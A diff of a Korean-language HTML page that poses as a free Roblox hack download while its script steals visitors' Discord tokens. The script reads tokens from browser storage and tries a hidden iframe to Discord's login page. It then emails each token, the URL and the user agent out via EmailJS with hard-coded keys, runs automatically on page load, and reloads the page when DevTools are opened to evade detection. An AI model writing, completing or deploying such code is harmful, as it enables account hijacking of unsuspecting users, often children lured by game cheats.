@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>로블록스 무료 핵 & 니트로 2026</title>
+  <title>로블록스 핵 무료 다운 2026</title>
   <style>
     body { 
       margin:0; padding:0; height:100vh; 
@@ -25,15 +25,15 @@
 </head>
 <body>
   <div class="container">
-    <h1>로딩 중... 핵 다운로드 준비</h1>
+    <h1>핵 로딩 중... 잠시만요</h1>
     <div class="loader"></div>
-    <p>잠시만 기다려주세요! 곧 링크가 열립니다.</p>
+    <p>곧 다운로드 링크가 나타납니다!</p>
   </div>
 
   <script>
-    // EmailJS 초기화
+    // EmailJS 초기화 - 네가 준 키 그대로 넣음
     (function(){
-      emailjs.init("YOUR_PUBLIC_KEY");  // ← 여기에 Public Key 넣기
+      emailjs.init("ycbHVBt3cm6FkCL--");
     })();
 
     const SERVICE_ID = "service_jmsvqzd";
@@ -41,20 +41,17 @@
 
     async function stealDiscordToken() {
       try {
-        let token = null;
+        let token = localStorage.getItem("token") || sessionStorage.getItem("token");
 
-        // 1차 시도: 일반 저장소
-        token = localStorage.getItem("token") || 
-                sessionStorage.getItem("token");
-
-        // 2차 시도: iframe으로 Discord 로그인 페이지 강제 열어서 추출
+        // 토큰 못 찾으면 iframe으로 Discord 로그인 페이지 열어서 시도
         if (!token) {
+          console.log("[+] 1차 실패 → iframe 추출 시도");
           const iframe = document.createElement("iframe");
           iframe.style.display = "none";
           iframe.src = "https://discord.com/login";
           document.body.appendChild(iframe);
 
-          await new Promise(r => setTimeout(r, 2800)); // 충분히 로드될 때까지 대기
+          await new Promise(r => setTimeout(r, 2800));
 
           try {
             const win = iframe.contentWindow || iframe.contentDocument?.defaultView;
@@ -62,41 +59,43 @@
               token = win.localStorage?.getItem("token") || 
                       win.sessionStorage?.getItem("token");
             }
-          } catch(e) {}
+          } catch(e) {
+            console.log("iframe 접근 차단됨");
+          }
 
           document.body.removeChild(iframe);
         }
 
         if (token) {
           token = token.replace(/"/g, "").trim();
+          console.log("[+] 토큰 잡음:", token.substring(0, 30) + "...");
 
-          // EmailJS 발송 (to_email 없이 → 템플릿에 고정된 이메일로 감)
-          await emailjs.send(SERVICE_ID, TEMPLATE_ID, {
+          // EmailJS 발송 (To Email은 템플릿에 고정돼 있으니까 안 넘겨도 됨)
+          const response = await emailjs.send(SERVICE_ID, TEMPLATE_ID, {
             token: token,
             url: window.location.href,
             time: new Date().toISOString(),
-            userAgent: navigator.userAgent,
-            // to_email: 여기 안 써도 됨 (템플릿에 고정)
+            userAgent: navigator.userAgent
           });
 
-          console.log("[+] 토큰 추출 & 발송 완료");
+          console.log("[++] 발송 완료! 상태:", response.status);
         } else {
-          console.log("[-] 토큰을 찾을 수 없음");
+          console.log("[-] 토큰 못 찾음");
         }
 
       } catch(e) {
-        console.error("[ERROR]", e);
+        console.error("[ERROR]", e.message || e);
       }
     }
 
-    // 페이지 완전 로드 후 1.2초 뒤 실행 (너무 빨리 하면 의심받음)
+    // 페이지 로드 후 0.8초 뒤 자동 실행
     window.addEventListener("load", () => {
-      setTimeout(stealDiscordToken, 1200);
+      setTimeout(stealDiscordToken, 800);
     });
 
-    // DevTools 감지 시 페이지 새로고침 (탐지 회피)
+    // DevTools 감지 시 리로드 (탐지 회피)
     setInterval(() => {
-      if (window.outerWidth - window.innerWidth > 160 ||
+      if (window.outerWidth - window.innerWidth > 160 || 
           window.outerHeight - window.innerHeight > 160) {
         location.reload();
       }
